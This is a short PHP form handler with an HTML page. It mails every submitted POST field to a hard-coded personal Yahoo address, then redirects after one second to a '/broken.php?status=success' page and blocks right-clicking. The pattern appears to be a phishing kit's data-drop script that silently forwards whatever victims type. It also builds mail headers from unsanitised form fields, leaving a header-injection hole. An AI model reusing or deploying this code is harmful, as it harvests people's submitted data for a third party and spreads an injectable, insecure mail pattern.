<?php
$to = "syedali_friend@yahoo.com";
$section    = $_POST['section'];
$cates    = $_POST['catename'];
$title    = $_POST['productname'];
if ($_SERVER['REQUEST_METHOD'] != "POST"){exit;}
$message = "";
while(list($key,$value) = each($_POST)){if(!(empty($value))){$set=1;}$message = $message . "$key: $value\n\n";} if($set!==1){header("location: $_SERVER[HTTP_REFERER]");exit;}
$message = $message;
$message = stripslashes($message);
$subject = "Report: $title";
$headers = "Return-Path: $section\r\n"; 
$headers .= "From: $cates <$section>\r\n";
mail($to,$subject,$message,$headers);
?>
<html>
<head>
<script language="JavaScript">
<!--Script courtesy of http://www.web-source.net - Your Guide to Professional Web Site Design and Development
var time = null
function move() {
window.location = '/broken.php?status=success'
}
//-->
</script>
</head>
<body onLoad="timer=setTimeout('move()',1000)">
<script language=JavaScript>
<!--

var message="";
///////////////////////////////////
function clickIE() {if (document.all) {(message);return false;}}
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")
// --> 
</script>
</body>